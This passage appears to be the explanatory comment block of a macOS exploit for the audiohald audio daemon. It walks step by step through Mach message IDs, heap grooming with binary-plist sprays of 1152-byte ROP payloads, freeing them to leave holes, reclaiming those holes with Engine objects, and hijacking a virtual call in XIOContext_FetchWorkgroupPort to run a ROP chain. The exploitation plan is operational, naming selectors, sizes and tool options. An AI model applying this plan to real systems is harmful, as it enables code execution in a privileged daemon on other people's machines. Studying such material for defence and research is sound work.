 *               struct ipc_kmsg_queue  messages;    // Linked list of messages
 *               mach_port_seqno_t      seqno;       // Sequence number
 *               mach_port_msgcount_t   msgcount;    // Message count
 *               mach_port_msgcount_t   qlimit;      // Queue limit
 *           } port;
 *           struct {
 *               struct waitq_set       setq;        // For port sets
 *           } pset;
 *       } data;
 *       struct waitq               waitq;           // Threads waiting
 *   };
 *
 * SEND PATH (ipc_mqueue_send):
 *
 *   1. Lock the port
 *   2. Check if queue is full (msgcount >= qlimit)
 *      - If full and no timeout: block on waitq
 *      - If full with timeout: return MACH_SEND_TIMED_OUT
 *   3. Enqueue message: ipc_kmsg_enqueue(&port->messages, kmsg)
 *   4. Increment msgcount
 *   5. Wake any threads waiting to receive: waitq_wakeup_one()
 *   6. Unlock port
 *
 * RECEIVE PATH (ipc_mqueue_receive):
 *
 *   1. Lock the port
 *   2. Check if messages available (msgcount > 0)
 *      - If empty and no timeout: block on waitq
 *      - If empty with timeout: return MACH_RCV_TIMED_OUT
 *   3. Dequeue message: kmsg = ipc_kmsg_dequeue(&port->messages)
 *   4. Decrement msgcount
 *   5. Wake any threads waiting to send (if queue was full)
 *   6. Unlock port
 *   7. Copy message out to userspace: ipc_kmsg_copyout()
 *
 * AUDIOHALD'S RECEIVE LOOP:
 *
 *   audiohald sits in a loop calling mach_msg() with MACH_RCV_MSG.
 *   When our message arrives, audiohald's thread wakes up and processes it.
 *   The msgh_id field tells audiohald which handler function to call.
 *
 * =============================================================================
 * =============================================================================
 * SECTION B: HEAP GROOMING - THEORY AND PRACTICE
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * B.1 WHAT IS HEAP GROOMING?
 * -----------------------------------------------------------------------------
 *
 * Heap grooming (also called heap feng shui or heap shaping) is the technique
 * of manipulating a process's heap layout to achieve a predictable state
 * for exploitation.
 *
 * GOALS OF HEAP GROOMING:
 *
 *   1. FILL THE HEAP: Exhaust existing free chunks to force allocator
 *      to request new memory from the OS, creating a "clean slate"
 *
 *   2. PLACE CONTROLLED DATA: Fill heap regions with attacker-controlled
 *      data (our ROP payload) at predictable offsets
 *
 *   3. CREATE HOLES: Free specific allocations to create "holes" of
 *      known sizes at known positions
 *
 *   4. RECLAIM HOLES: Trigger allocations (like object creation) that
 *      will reuse the holes, placing objects where we want them
 *
 * WHY IT WORKS:
 *
 *   Modern allocators (like libmalloc on macOS) use bins/buckets for
 *   different allocation sizes. When you free memory, it goes into a
 *   freelist. When you allocate, you get memory from the freelist.
 *
 *   By controlling the sequence of allocs and frees, we can predict
 *   WHERE specific objects will be placed in memory.
 *
 * -----------------------------------------------------------------------------
 * B.2 macOS HEAP ALLOCATOR - libmalloc INTERNALS
 * -----------------------------------------------------------------------------
 *
 * macOS uses libmalloc (open source: https://opensource.apple.com/source/libmalloc/)
 *
 * ALLOCATOR ZONES:
 *
 *   DEFAULT ZONE (scalable_zone):
 *     - Main allocator for most allocations
 *     - Uses magazine-based design (per-CPU caches)
 *
 *   NANO ZONE (for small allocations, iOS/macOS):
 *     - Handles tiny allocations (< 256 bytes)
 *     - Uses bump-pointer allocation within "bands"
 *     - Very fast but predictable
 *
 * SCALABLE ZONE SIZE CLASSES (typical):
 *
 *   TINY allocations: 16, 32, 48, 64, 80, ... 1008 bytes
 *   SMALL allocations: 1024, 2048, ... 32KB
 *   LARGE allocations: > 32KB (backed by vm_allocate)
 *
 * KEY INSIGHT FOR THIS EXPLOIT:
 *
 *   Our payload is 1152 bytes. This falls in the SMALL allocation range.
 *   By spraying many 1152-byte allocations, we fill the SMALL freelist.
 *   When we free some, they go back to the SMALL freelist.
 *   When audiohald allocates an Engine object (~similar size), it gets
 *   memory from the SMALL freelist - potentially our freed slots!
 *
 * MAGAZINE-BASED ALLOCATION:
 *
 *   struct magazine_t {
 *       void *mag_last_free;           // Most recently freed block
 *       region_t *mag_last_region;     // Most recently used region
 *       // Per-CPU to avoid lock contention
 *   };
 *
 *   Allocation path:
 *     1. Check thread-local cache (mag_last_free)
 *     2. If empty, check magazine's freelist
 *     3. If empty, allocate from region
 *     4. If region full, create new region
 *
 * FREELIST STRUCTURE:
 *
 *   Freed blocks contain a pointer to the next free block:
 *
 *   +------------------+
 *   | next_free_ptr    |  <- First 8 bytes of freed block
 *   +------------------+
 *   | ... garbage ...  |  <- Rest of freed block (may contain old data!)
 *   +------------------+
 *
 *   This is important: freed memory ISN'T zeroed! Our payload data
 *   remains in the freed slots until overwritten.
 *
 * -----------------------------------------------------------------------------
 * B.3 HEAP SPRAY IMPLEMENTATION IN THIS EXPLOIT
 * -----------------------------------------------------------------------------
 *
 * THE SPRAY MECHANISM:
 *
 *   For each iteration:
 *     1. Create a MetaDevice (allocates device object in audiohald)
 *     2. Set property 'acom' with our binary plist
 *     3. Plist contains array of CFStrings, each holding ROP payload
 *
 * WHY USE PLISTS?
 *
 *   We can't directly allocate arbitrary memory in audiohald.
 *   But we CAN send property list data that audiohald will parse.
 *   When audiohald parses the plist:
 *     - CFPropertyListCreateWithData() is called
 *     - This creates CFString objects for each string in the plist
 *     - CFString allocates backing storage for the string contents
 *     - Our "string contents" are actually ROP payload bytes!
 *
 * THE SPRAY DATA PATH:
 *
 *   Exploit                    Kernel                     audiohald
 *   -------                    ------                     ---------
 *   1. Create binary plist
 *      with payload strings
 *
 *   2. vm_allocate() to
 *      create OOL buffer
 *
 *   3. mach_msg() sends
 *      message with OOL
 *                              4. Kernel creates ipc_kmsg
 *                              5. vm_map_copyin() copies
 *                                 our OOL data
 *                              6. Enqueues to audiohald's port
 *
 *                              7. audiohald receives msg
 *                              8. vm_map_copyout() maps
 *                                 OOL into audiohald         <-- OOL data now in audiohald's heap!
 *
 *                                                     9. Handler parses plist
 *                                                    10. CFString allocs for each
 *                                                        string in array
 *                                                        <- PAYLOAD IN HEAP!
 *
 * ALLOCATION SIZE CONTROL:
 *
 *   The ROP payload is 1152 bytes. When CFString creates storage:
 *
 *   CFStringCreateWithBytes(allocator, bytes, 1152, kCFStringEncodingUTF16LE, ...)
 *     -> __CFStrAllocateMutableContents()
 *       -> CFAllocatorAllocate(allocator, 1152 + overhead, 0)
 *         -> malloc(~1168 bytes)  // With string header overhead
 *
 *   So each CFString results in a ~1168 byte allocation.
 *   This consistently hits the same allocator bin.
 *
 * SPRAY QUANTITY:
 *
 *   --iterations N:  How many messages to send
 *   --allocs N:      How many strings per message (per plist)
 *
 *   Total spray allocations = iterations √ó allocs
 *
 *   Example: --iterations 100 --allocs 50 = 5000 payload allocations
 *   At ~1168 bytes each = ~5.8 MB of controlled heap data
 *
 * -----------------------------------------------------------------------------
 * B.4 HOLE CREATION - THE FREEING PHASE
 * -----------------------------------------------------------------------------
 *
 * After spraying, we have:
 *
 *   +--------+--------+--------+--------+--------+--------+
 *   | META-1 | spray  | META-2 | spray  | META-3 | spray  | ...
 *   | DEVICE | payld  | DEVICE | payld  | DEVICE | payld  |
 *   +--------+--------+--------+--------+--------+--------+
 *
 *   Each MetaDevice has associated property storage containing our payloads.
 *
 * THE FREE MECHANISM:
 *
 *   To free allocations, we set the 'acom' property to a tiny value:
 *
 *   generateFreePlist() creates:
 *     <dict><key>arr</key><string>FREE</string></dict>
 *
 *   When audiohald processes this:
 *     1. Old property value (our large payload array) is released
 *     2. CFRelease() called on the old CFArray
 *     3. CFRelease() called on each CFString in the array
 *     4. Each CFString's backing storage is freed
 *     5. FREE SLOTS NOW EXIST IN THE HEAP!
 *
 * AFTER FREEING:
 *
 *   +--------+--------+--------+--------+--------+--------+
 *   | META-1 | spray  | META-2 | FREED  | META-3 | FREED  | ...
 *   | DEVICE | payld  | DEVICE | HOLES  | DEVICE | HOLES  |
 *   +--------+--------+--------+--------+--------+--------+
 *
 *   The FREED HOLES are ~1168 bytes each.
 *   The freelist now contains these slots.
 *   BUT: The freed memory still contains our payload data!
 *   (Remember: free() doesn't zero memory)
 *
 * -----------------------------------------------------------------------------
 * B.5 OBJECT PLACEMENT - RECLAIMING HOLES
 * -----------------------------------------------------------------------------
 *
 * Now we create Engine objects:
 *
 *   createEngineObjects() sends message 1010042 with selector 'mktp'
 *   audiohald creates a new Engine object:
 *     new EngineObject()  // C++ allocation
 *       -> operator new(sizeof(EngineObject))
 *         -> malloc(sizeof(EngineObject))
 *           -> Allocator checks freelist for matching size
 *           -> May return one of our freed slots!
 *
 * CRITICAL INSIGHT:
 *
 *   If sizeof(EngineObject) is close to our spray allocation size (~1168),
 *   the Engine object WILL land in one of our freed slots.
 *
 *   The Engine object's vtable pointer and fields get written.
 *   BUT: Not all of the allocation is overwritten!
 *   Bytes beyond sizeof(EngineObject) still contain our payload.
 *
 * MEMORY LAYOUT AFTER OBJECT CREATION:
 *
 *   +------------------+------------------+
 *   | Engine Object    | RESIDUAL PAYLOAD |
 *   | vtable, fields   | from previous    |
 *   | (overwritten)    | CFString alloc   |
 *   +------------------+------------------+
 *   |<-- sizeof(Eng) ->|<-- remainder --->|
 *
 * =============================================================================
 * =============================================================================
 * SECTION C: ROP CHAIN MECHANICS - RETURN-ORIENTED PROGRAMMING
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * C.1 WHAT IS ROP?
 * -----------------------------------------------------------------------------
 *
 * Return-Oriented Programming is a code-reuse attack technique that:
 *   - Works despite non-executable heap (NX/DEP)
 *   - Works despite ASLR (with info leak)
 *   - Chains together "gadgets" - small code sequences ending in RET
 *
 * TRADITIONAL EXPLOIT (no NX):
 *   Stack: [shellcode][shellcode][shellcode]...
 *   Overwrite return address to point to shellcode
 *   CPU executes our shellcode directly
 *
 * ROP EXPLOIT (with NX):
 *   Stack: [gadget1_addr][gadget2_addr][gadget3_addr]...
 *   Each gadget is EXISTING CODE in the program/libraries
 *   Gadgets end with RET, which pops next address and jumps
 *   Chain of gadgets performs arbitrary computation
 *
 * GADGET EXAMPLE:
 *
 *   Gadget at 0x7fff12345678:
 *     pop rdi        ; Load value from stack into rdi
 *     ret            ; Jump to next gadget
 *
 *   Gadget at 0x7fff23456789:
 *     pop rsi        ; Load value from stack into rsi
 *     ret            ; Jump to next gadget
 *
 *   Gadget at 0x7fff34567890:
 *     call [rax]     ; Call function pointer in rax
 *     ret
 *
 *   Stack layout:
 *     [0x7fff12345678]  <- First gadget: pop rdi; ret
 *     [0x00000000002f]  <- Value for rdi ("/")
 *     [0x7fff23456789]  <- Second gadget: pop rsi; ret
 *     [0x0000000000ff]  <- Value for rsi
 *     ...
 *
 * -----------------------------------------------------------------------------
 * C.2 arm64 (Apple Silicon) SPECIFICS
 * -----------------------------------------------------------------------------
 *
 * On arm64 (M1/M2/M3), ROP is slightly different:
 *
 * KEY DIFFERENCES FROM x86_64:
 *
 *   1. Link Register (LR/x30):
 *      - Function return address stored in LR, not on stack
 *      - RET instruction jumps to LR
 *      - To chain, need gadgets that load LR from memory
 *
 *   2. Stack Pointer:
 *      - SP must be 16-byte aligned
 *      - Misaligned SP causes alignment fault
 *
 *   3. PAC (Pointer Authentication):
 *      - On newer chips, return addresses are signed
 *      - PAC adds cryptographic signature to pointers
 *      - Invalid signature = crash
 *      - Bypassing PAC requires additional techniques
 *
 * arm64 ROP GADGET PATTERNS:
 *
 *   Load LR from stack and return:
 *     ldp x29, x30, [sp], #0x10   ; Load fp and lr from stack
 *     ret                         ; Return via lr
 *
 *   Call through register:
 *     blr x8                      ; Branch-link to x8, sets lr
 *     ...
 *
 *   Load register from stack:
 *     ldr x0, [sp, #0x20]         ; Load x0 from stack offset
 *     ...
 *
 * -----------------------------------------------------------------------------
 * C.3 JOP - JUMP-ORIENTED PROGRAMMING (Alternative)
 * -----------------------------------------------------------------------------
 *
 * JOP uses indirect jumps instead of returns:
 *
 *   Dispatcher gadget:
 *     ldr x8, [x19]        ; Load next gadget address
 *     add x19, x19, #8     ; Advance gadget pointer
 *     br x8                ; Jump to gadget
 *
 *   Functional gadgets end with jump back to dispatcher
 *
 * ADVANTAGE: Doesn't use return addresses (may bypass some defenses)
 * DISADVANTAGE: Need to find/control dispatcher and gadget table
 *
 * -----------------------------------------------------------------------------
 * C.4 THE PAYLOAD FILE - rop_payload.bin
 * -----------------------------------------------------------------------------
 *
 * This exploit loads the ROP chain from "rop_payload.bin" (1152 bytes).
 *
 * EXPECTED STRUCTURE:
 *
 *   Offset 0x000: [Fake object vtable pointer / first gadget]
 *   Offset 0x008: [Second gadget / data]
 *   Offset 0x010: [Third gadget / data]
 *   ...
 *   Offset 0x47F: [End of 1152 bytes]
 *
 * WHY 1152 BYTES?
 *
 *   This size is chosen to match the target allocation bin.
 *   The Engine object's allocation size is around this range.
 *   Matching sizes = higher probability of landing in our slot.
 *
 * PAYLOAD CONTENT DEPENDS ON:
 *
 *   1. Target macOS version (affects library addresses)
 *   2. ASLR slide (may need info leak to calculate)
 *   3. Desired post-exploitation action
 *   4. Whether PAC is enabled and how to bypass
 *
 * GENERIC PAYLOAD STRUCTURE:
 *
 *   +-------------------+
 *   | Fake vtable ptr   |  <- Points to controlled memory / gadget
 *   +-------------------+
 *   | Field mimicking   |
 *   | Engine object     |
 *   +-------------------+
 *   | ROP gadget chain  |
 *   | addresses         |
 *   +-------------------+
 *   | Data values for   |
 *   | gadgets to use    |
 *   +-------------------+
 *
 * -----------------------------------------------------------------------------
 * C.5 CONTROL FLOW HIJACK - HOW ROP GETS EXECUTED
 * -----------------------------------------------------------------------------
 *
 * THE VULNERABLE CODE PATH:
 *
 *   When trigger_vulnerability() sends message 1010059:
 *
 *   audiohald receives message:
 *     -> Dispatch to XIOContext_FetchWorkgroupPort handler
 *       -> Handler looks up object by ID
 *       -> Calls virtual method on the object
 *
 *   VULNERABLE SCENARIO:
 *
 *     1. Object pointer points to our controlled memory
 *        (due to heap grooming / use-after-free / type confusion)
 *
 *     2. Virtual method call: object->someMethod()
 *        Compiles to:
 *          ldr x8, [x0]         ; Load vtable from object
 *          ldr x8, [x8, #offset] ; Load function pointer
 *          blr x8               ; Call function
 *
 *     3. If x0 points to our payload:
 *          - [x0] = our fake vtable pointer
 *          - [fake_vtable + offset] = our first gadget
 *          - blr x8 jumps to our gadget!
 *
 * TRIGGERING ROP EXECUTION:
 *
 *   HEAP LAYOUT BEFORE TRIGGER:
 *
 *   +---------------------------+
 *   | Engine Object (corrupted) |
 *   |   vtable ptr -> [payload] |  <- Points to our controlled data
 *   |   other fields            |
 *   +---------------------------+
 *   | Our ROP payload           |
 *   |   fake_vtable[0] = gad1   |  <- First gadget address
 *   |   fake_vtable[1] = gad2   |
 *   |   ...                     |
 *   +---------------------------+
 *
 *   EXECUTION FLOW:
 *
 *   1. audiohald: obj->fetchWorkgroupPort()
 *   2. CPU: ldr x8, [x0]        -> loads fake vtable address
 *   3. CPU: ldr x8, [x8, #off]  -> loads gadget1 address
 *   4. CPU: blr x8              -> jumps to gadget1
 *   5. Gadget1 executes, ends with ret/br
 *   6. CPU: jumps to gadget2
 *   ... ROP chain executes ...
 *
 * =============================================================================
 * =============================================================================
 * SECTION D: BINARY PLIST FORMAT AND CFSTRING INTERNALS
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * D.1 BINARY PLIST FORMAT (bplist00)
 * -----------------------------------------------------------------------------
 *
 * Binary plists are Apple's efficient serialization format.
 * They can represent: dict, array, string, data, number, date, bool.
 *
 * FILE STRUCTURE:
 *
 *   +-------------------+
 *   | Magic: "bplist00" |  8 bytes
 *   +-------------------+
 *   | Object data       |  Variable
 *   | (serialized       |
 *   |  objects)         |
 *   +-------------------+
 *   | Offset table      |  Array of object offsets
 *   +-------------------+
 *   | Trailer           |  32 bytes
 *   +-------------------+
 *
 * TRAILER STRUCTURE (last 32 bytes):
 *
 *   Byte 0-5:   Unused (padding)
 *   Byte 6:     Sort version
 *   Byte 7:     Offset integer size (bytes per offset)
 *   Byte 8:     Object reference size
 *   Byte 9-16:  Number of objects (64-bit BE)
 *   Byte 17-24: Root object index (64-bit BE)
 *   Byte 25-32: Offset table offset (64-bit BE)
 *
 * OBJECT ENCODING:
 *
 *   Each object starts with a type marker byte:
 *
 *   0x00:       null
 *   0x08:       false
 *   0x09:       true
 *   0x1N:       int (N+1 bytes, big-endian)
 *   0x2N:       real (N=2 for float, N=3 for double)
 *   0x3N:       date (N=3, 8-byte float since 2001-01-01)
 *   0x4N:       data (N bytes follow, or extended length)
 *   0x5N:       ASCII string (N bytes)
 *   0x6N:       UTF-16BE string (N 2-byte chars)
 *   0xAN:       array (N objects)
 *   0xDN:       dict (N key-value pairs)
 *
 * STRING ENCODING IN BINARY PLIST:
 *
 *   UTF-16 strings (0x6N marker) store big-endian UTF-16.
 *   When CFPropertyListCreateWithData() parses this:
 *     - Reads UTF-16BE code units
 *     - Creates CFString with CFStringCreateWithBytes()
 *     - String data is stored in native byte order (little-endian on Intel/ARM)
 *
 * OUR EXPLOITATION:
 *
 *   We use CFStringCreateWithBytes() with kCFStringEncodingUTF16LE
 *   to create strings from our raw payload bytes.
 *   CFPropertyListCreateData() then serializes to binary plist.
 *   When audiohald parses, it recreates the CFString,
 *   and the backing storage contains our exact bytes!
 *
 * -----------------------------------------------------------------------------
 * D.2 CFSTRING INTERNAL STRUCTURE
 * -----------------------------------------------------------------------------
 *
 * CFString is a "toll-free bridged" type with NSString.
 * Internally, it's a struct with multiple possible storage representations:
 *
 * CFSTRING VARIANTS:
 *
 *   1. INLINE STRING (small strings):
 *      - Characters stored directly in CFString struct
 *      - No separate allocation
 *      - Limited to ~12 characters on 64-bit
 *
 *   2. EXTERNAL BUFFER (our case):
 *      - Characters stored in separate heap allocation
 *      - CFString has pointer to buffer
 *      - Used for larger strings
 *
 *   3. CONSTANT STRING:
 *      - Points to constant data (e.g., from __DATA segment)
 *      - No heap allocation
 *
 * CFSTRING STRUCT (simplified, from CFString.c):
 *
 *   struct __CFString {
 *       CFRuntimeBase _base;           // 16 bytes: isa, flags
 *       union {
 *           struct {
 *               void *buffer;           // Pointer to character data
 *               CFIndex length;         // Character count
 *               CFIndex capacity;       // Buffer capacity
 *               CFAllocatorRef alloc;   // Allocator for buffer
 *           } externalBuffer;
 *           struct {
 *               uint8_t inline_contents[12];  // Inline storage
 *               uint8_t length;
 *           } inlineBuffer;
 *       };
 *   };
 *
 * KEY POINTS:
 *
 *   - When we create a 1152-byte CFString, it's EXTERNAL
 *   - CFString allocates a ~1152 byte buffer for the character data
 *   - THIS ALLOCATION is what lands in audiohald's heap
 *   - The CFString object itself is separate (smaller allocation)
 *
 * MEMORY LAYOUT:
 *
 *   +------------------+         +------------------+
 *   | CFString struct  |  -----> | Character buffer |
 *   | isa ptr          |         | (1152 bytes)     |
 *   | flags            |         | OUR PAYLOAD!     |
 *   | buffer ptr   ----+         +------------------+
 *   | length           |
 *   +------------------+
 *       (~48 bytes)                 (~1168 bytes with header)
 *
 * -----------------------------------------------------------------------------
 * D.3 WHY UTF-16 ENCODING?
 * -----------------------------------------------------------------------------
 *
 * We interpret payload bytes as UTF-16LE code units:
 *
 *   for (i = 0; i < raw_bytes.size(); i += 2) {
 *       uint16_t val;
 *       memcpy(&val, &raw_bytes[i], 2);
 *       payload_utf16.push_back(val);
 *   }
 *
 * REASONS:
 *
 *   1. BYTE PRESERVATION:
 *      - UTF-16 uses 2-byte code units
 *      - Most 16-bit values are valid UTF-16
 *      - Surrogates (0xD800-0xDFFF) need special handling
 *      - But most arbitrary bytes survive round-trip
 *
 *   2. NO NULL TERMINATION:
 *      - CFString can contain embedded nulls
 *      - Unlike C strings, length is explicit
 *      - Our payload can have 0x00 bytes
 *
 *   3. EFFICIENT STORAGE:
 *      - UTF-16 strings are stored as-is in memory
 *      - No expansion (unlike UTF-8 for high bytes)
 *
 * POTENTIAL ISSUES:
 *
 *   - Invalid surrogate pairs may be rejected or modified
 *   - Some byte sequences may be normalized
 *   - Solution: Carefully craft payload to avoid problematic values
 *     Or use <data> base64 encoding instead of <string>
 *
 * ALTERNATIVE: BINARY DATA IN PLIST:
 *
 *   Instead of strings, we could use:
 *     <data>base64encodedpayload</data>
 *
 *   This would create CFData instead of CFString.
 *   CFData stores raw bytes without interpretation.
 *   BUT: CFData allocation may hit different size class.
 *   Current approach uses CFString for specific allocation size.
 *
 * -----------------------------------------------------------------------------
 * D.4 CFARRAY STORAGE
 * -----------------------------------------------------------------------------
 *
 * We wrap our strings in a CFArray:
 *
 *   CFMutableArrayRef cfArray = CFArrayCreateMutable(NULL, 0, &kCFTypeArrayCallBacks);
 *   for (i = 0; i < allocs_per_iteration; i++) {
 *       CFArrayAppendValue(cfArray, strEntry);
 *   }
 *
 * CFARRAY INTERNALS:
 *
 *   struct __CFArray {
 *       CFRuntimeBase _base;
 *       CFIndex _count;              // Number of elements
 *       CFIndex _capacity;           // Allocated capacity
 *       void **_values;              // Array of object pointers
 *   };
 *
 * WHEN AUDIOHALD PARSES:
 *
 *   1. CFPropertyListCreateWithData() called on binary plist
 *   2. Parser encounters array marker (0xAN)
 *   3. Creates CFArray with N elements
 *   4. For each element:
 *      - If string: CFStringCreateWithBytes() called
 *      - New CFString created with backing buffer
 *      - Buffer allocated from audiohald's heap!
 *   5. CFArray holds references to all CFStrings
 *
 * RESULT:
 *
 *   allocs_per_iteration separate heap allocations
 *   Each allocation is ~1168 bytes
 *   Each allocation contains our payload bytes
 *
 * =============================================================================
 * =============================================================================
 * SECTION E: AUDIOHALD OBJECT MODEL AND MESSAGE DISPATCH
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * E.1 AUDIOHALD ARCHITECTURE
 * -----------------------------------------------------------------------------
 *
 * audiohald (Audio HAL Daemon) is the userspace component of CoreAudio.
 * It manages audio devices, streams, and provides the HAL API to apps.
 *
 * PROCESS HIERARCHY:
 *
 *   launchd (PID 1)
 *       |
 *       +-- audiohald (Audio HAL Daemon)
 *       |      |
 *       |      +-- Per-client threads
 *       |      +-- Device management threads
 *       |
 *       +-- coreaudiod (Core Audio Daemon) [separate service]
 *
 * SERVICE REGISTRATION:
 *
 *   audiohald registers "com.apple.audio.audiohald" with launchd.
 *   bootstrap_look_up() returns a send right to audiohald's service port.
 *
 * -----------------------------------------------------------------------------
 * E.2 MESSAGE DISPATCH IN AUDIOHALD
 * -----------------------------------------------------------------------------
 *
 * audiohald uses MIG (Mach Interface Generator) for message handling.
 *
 * MIG BASICS:
 *
 *   MIG takes a .defs file describing messages:
 *
 *   routine XSystem_Open(
 *       server_port: mach_port_t;
 *       notification_port: mach_port_move_send_t;
 *       ...
 *   );
 *
 *   MIG generates:
 *     - Client stub (for calling the routine)
 *     - Server stub (for receiving and dispatching)
 *     - Dispatch table mapping message IDs to handlers
 *
 * DISPATCH TABLE STRUCTURE:
 *
 *   typedef struct {
 *       mig_stub_routine_t stub;    // Handler function
 *       mach_msg_size_t size;       // Expected message size
 *   } mig_routine_descriptor;
 *
 *   mig_routine_descriptor audiohald_routines[] = {
 *       { _XSystem_Open,        sizeof(XSystem_Open_msg)        }, // 1010000
 *       { _XSystem_Close,       sizeof(XSystem_Close_msg)       }, // 1010001
 *       { _XSystem_GetObjectInfo, sizeof(...)                   }, // 1010002
 *       ...
 *       { _XIOContext_FetchWorkgroupPort, sizeof(...)           }, // 1010059
 *   };
 *
 * DISPATCH FLOW:
 *
 *   1. audiohald calls mach_msg() to receive
 *   2. Message arrives with msgh_id = 1010059
 *   3. Dispatcher: index = msgh_id - 1010000
 *   4. handler = audiohald_routines[index].stub
 *   5. handler(request_msg, reply_msg) called
 *   6. Handler does actual work
 *   7. Reply sent back (if requested)
 *
 * -----------------------------------------------------------------------------
 * E.3 OBJECT ID SYSTEM
 * -----------------------------------------------------------------------------
 *
 * audiohald tracks objects using 32-bit IDs.
 *
 * OBJECT TYPES (4-char codes, stored reversed):
 *
 *   "ngnejboa" = "aobjenng" reversed = Engine object
 *   "ggaaveda" = "adevaagg" reversed = MetaDevice (aggregate device)
 *   "mertsjba" = "abjstrm?" reversed = Stream object
 *   etc.
 *
 * OBJECT TABLE:
 *
 *   audiohald maintains a table: object_id -> object_ptr
 *
 *   struct ObjectTable {
 *       std::unordered_map<uint32_t, HALObject*> objects;
 *       uint32_t next_id;
 *   };
 *
 * OBJECT LIFECYCLE:
 *
 *   1. Creation: ID assigned, object allocated, added to table
 *   2. Usage: Messages reference object by ID
 *   3. Destruction: Object freed, removed from table
 *
 * OBJECT LOOKUP:
 *
 *   When message handler receives object_id:
 *
 *   HALObject* obj = object_table.lookup(object_id);
 *   if (!obj) return kAudioHardwareBadObjectError;
 *   obj->doSomething();  // Virtual call!
 *
 * -----------------------------------------------------------------------------
 * E.4 KEY MESSAGE HANDLERS
 * -----------------------------------------------------------------------------
 *
 * MESSAGE 1010000 - XSystem_Open:
 *
 *   Purpose: Initialize client session
 *   Input: notification_port (send right)
 *   Action:
 *     - Creates client state structure
 *     - Stores notification port for async events
 *     - Required before other operations
 *
 * MESSAGE 1010002 - XSystem_GetObjectInfo:
 *
 *   Purpose: Query object type
 *   Input: object_id
 *   Output: 8-byte type string (e.g., "ngnejboa")
 *   Action:
 *     - Looks up object in table
 *     - Returns object's type identifier
 *   Our use: Enumerate objects, find Engine objects
 *
 * MESSAGE 1010005 - XSystem_CreateMetaDevice:
 *
 *   Purpose: Create aggregate audio device
 *   Input: OOL plist with device config
 *   Action:
 *     - Parses plist (name, UID, subdevices)
 *     - Allocates MetaDevice object
 *     - Assigns new object ID
 *   Our use: Heap grooming (device creation = allocation)
 *
 * MESSAGE 1010034 - XObject_SetPropertyData:
 *
 *   Purpose: Set property on an object
 *   Input: object_id, selector, scope, element, OOL plist data
 *   Action:
 *     - Looks up object
 *     - Calls obj->SetPropertyData(selector, scope, element, data)
 *     - Handler stores data (ALLOCATES in heap!)
 *   Our use:
 *     - Selector 'acom': Used to spray/free allocations
 *     - Data stored as property = controlled allocation
 *
 * MESSAGE 1010042 - XObject_GetPropertyData:
 *
 *   Purpose: Get property from an object
 *   Input: object_id, selector, scope, element, OOL plist
 *   Special behavior for selector 'mktp' (make tap):
 *     - CREATES a new Engine/Tap object!
 *     - Allocates Engine object in heap
 *   Our use: Create vulnerable Engine objects
 *
 * MESSAGE 1010059 - XIOContext_FetchWorkgroupPort:
 *
 *   Purpose: Get workgroup port for I/O context
 *   Input: object_id
 *   Action:
 *     - Looks up object
 *     - Calls obj->FetchWorkgroupPort()
 *   VULNERABILITY:
 *     - Under certain conditions, object pointer invalid
 *     - May dereference corrupted/controlled memory
 *     - Virtual call on corrupted object = controlled PC
 *
 * -----------------------------------------------------------------------------
 * E.5 ENGINE OBJECT STRUCTURE
 * -----------------------------------------------------------------------------
 *
 * Engine objects are C++ objects inheriting from HALObject base class.
 *
 * TYPICAL C++ OBJECT LAYOUT:
 *
 *   struct EngineObject {
 *       void* vtable;              // Offset 0x00: Virtual table pointer
 *       uint32_t object_id;        // Offset 0x08: Object ID
 *       uint32_t type;             // Offset 0x0C: Type code
 *       // ... more fields ...
 *       IOContext* io_context;     // Some offset: I/O context pointer
 *       // ... more fields ...
 *   };
 *
 * VTABLE STRUCTURE:
 *
 *   vtable for EngineObject:
 *     [0]: destructor
 *     [1]: GetObjectID
 *     [2]: GetType
 *     [3]: SetPropertyData
 *     [4]: GetPropertyData
 *     ...
 *     [N]: FetchWorkgroupPort    // THE VULNERABLE METHOD
 *
 * VIRTUAL CALL MECHANISM:
 *
 *   obj->FetchWorkgroupPort() compiles to:
 *
 *   ldr x8, [x0]          // Load vtable pointer from object
 *   ldr x8, [x8, #N*8]    // Load function pointer from vtable
 *   blr x8                // Call the function
 *
 * EXPLOITATION:
 *
 *   If we control memory at x0 (object pointer):
 *     - [x0] can be fake vtable address (pointing to our data)
 *     - [fake_vtable + N*8] can be our first gadget
 *     - blr x8 transfers control to ROP chain!
 *
 * =============================================================================
 * =============================================================================
 * SECTION F: EXPLOITATION FLOW - PUTTING IT ALL TOGETHER
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * F.1 COMPLETE EXPLOITATION TIMELINE
 * -----------------------------------------------------------------------------
 *
 * INITIALIZATION:
 *
 *   t=0: Exploit starts
 *         |
 *         +-> task_get_bootstrap_port()
 *         |     Get bootstrap port from kernel
 *         |
 *         +-> bootstrap_look_up("com.apple.audio.audiohald")
 *         |     Get send right to audiohald
 *         |
 *         +-> Send message 1010000 (XSystem_Open)
 *               Register as client
 *
 * HEAP GROOMING PHASE:
 *
 *   t=1: For i = 1 to num_iterations:
 *         |
 *         +-> Send message 1010005 (CreateMetaDevice)
 *         |     Creates MetaDevice object_i
 *         |
 *         +-> Send message 1010034 (SetPropertyData)
 *         |     selector='acom', data=plist with payload strings
 *         |
 *         +-> audiohald parses plist:
 *         |     - Creates CFArray
 *         |     - Creates allocs_per_iteration CFStrings
 *         |     - Each CFString backing buffer = 1168 bytes
 *         |     - Total: iterations √ó allocs heap allocations
 *         |
 *         +-> HEAP NOW FILLED WITH CONTROLLED DATA
 *
 * HOLE CREATION PHASE:
 *
 *   t=2: For i = 1 to num_frees:
 *         |
 *         +-> Send message 1010034 (SetPropertyData)
 *         |     selector='acom', data=small plist
 *         |
 *         +-> audiohald replaces property:
 *         |     - Old CFArray released
 *         |     - All CFStrings in array released
 *         |     - Backing buffers freed
 *         |
 *         +-> HOLES CREATED IN HEAP
 *         |     (Freed memory still contains payload!)
 *
 * VULNERABLE OBJECT CREATION:
 *
 *   t=3: For i = 1 to num_engine_objects:
 *         |
 *         +-> Send message 1010042 (GetPropertyData)
 *         |     selector='mktp' (make tap)
 *         |
 *         +-> audiohald creates Engine object:
 *         |     - new EngineObject() called
 *         |     - malloc() may return freed slot!
 *         |     - Engine object partially overwrites payload
 *         |     - Some payload bytes remain in allocation
 *         |
